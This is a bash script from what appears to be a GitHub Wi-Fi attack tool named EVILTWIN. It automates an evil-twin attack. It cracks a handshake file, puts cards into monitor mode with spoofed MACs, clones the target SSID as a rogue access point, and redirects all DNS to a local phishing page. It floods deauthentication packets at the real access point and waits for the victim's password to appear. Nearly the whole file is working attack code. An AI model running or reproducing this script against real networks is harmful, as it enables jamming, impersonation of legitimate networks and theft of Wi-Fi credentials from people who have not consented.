#!/bin/bash
DIR=`realpath "$0"`
PDIR=`dirname "$DIR"`
clear
echo -e "\033[1;37m---------------------------------------------------\033[0m"
echo -ne "\033[1;33m"
cat $PDIR/header
echo -e "\033[0m"
echo -e "\033[1;37m---------------------------------------------------\033[0m"
echo -e "\033[1;37m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m"
echo -e "\033[1;37m░░░░░                                         ░░░░░\033[0m"
echo -e "\033[1;37m░░░░░ \033[1;31mhttps://github.com/mayankmetha/EVILTWIN\033[1;37m ░░░░░\033[0m"
echo -e "\033[1;37m░░░░░ \033[1;31m                  1.1                  \033[1;37m ░░░░░\033[0m"
echo -e "\033[1;37m░░░░░                                         ░░░░░\033[0m"
echo -e "\033[1;37m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m"
echo -e "\033[1;37m---------------------------------------------------\033[0m"
service apache2 stop
service network-manager stop
killall hostapd dnsmasq > /dev/null 2>&1
rm -rf $PDIR/tmp/
rm -rf $PDIR/sites/
mkdir $PDIR/tmp > /dev/null 2>&1
echo -en "\033[1;36mEnter handshake cap file location from root:         \033[0m"
read cap
aircrack-ng -j $PDIR/tmp/wifi $cap > /dev/null 2>&1
echo -en "\033[1;36mEnter wireless card name to start evil access point: \033[0m"
read w0
ifconfig $w0 down
iwconfig $w0 mode monitor
iwconfig $w0 txpower 30 > /dev/null 2>&1
macchanger -r $w0 > /dev/null 2>&1
ifconfig $w0 up
echo -en "\033[1;36mEnter wireless card name to start network jammer:    \033[0m"
read w1
ifconfig $w1 down
iwconfig $w1 mode monitor
iwconfig $w1 txpower 30 > /dev/null 2>&1
macchanger -r $w1 > /dev/null 2>&1
ifconfig $w1 up
echo -en "\033[1;36mEnter mac address of target access point:            \033[0m"
read bssid
echo -en "\033[1;36mEnter target channel number:                         \033[0m"
read channel
echo -en "\033[1;36mEnter name of target access point:                   \033[0m"
read ssid
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
printf "interface=$w0\nssid=$ssid\nchannel=$channel\ndriver=nl80211" > $PDIR/tmp/hostapd.conf
printf "interface=$w0\ndhcp-range=10.0.0.10,10.0.0.100,8h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1" > $PDIR/tmp/dnsmasq.conf
hostapd $PDIR/tmp/hostapd.conf -B > /dev/null 2>&1
dnsmasq -C $PDIR/tmp/dnsmasq.conf > /dev/null 2>&1
ifconfig $w0 10.0.0.1 netmask 255.255.255.0
mkdir $PDIR/sites > /dev/null 2>&1
node $PDIR/templateSelect.js
echo -e "\033[1;33mOpening windows do not close it"
echo -e "They will close automatically"
echo -e "Please wait till password appears\033[0m"
iwconfig $w1 channel $channel
xterm -title "evil-twin" -e "airodump-ng $w1 -a -c $channel --essid $ssid" &
xterm -title "evil-twin" -e "aireplay-ng -0 9999999999 -a $bssid $w1" &
node $PDIR/sites/server.js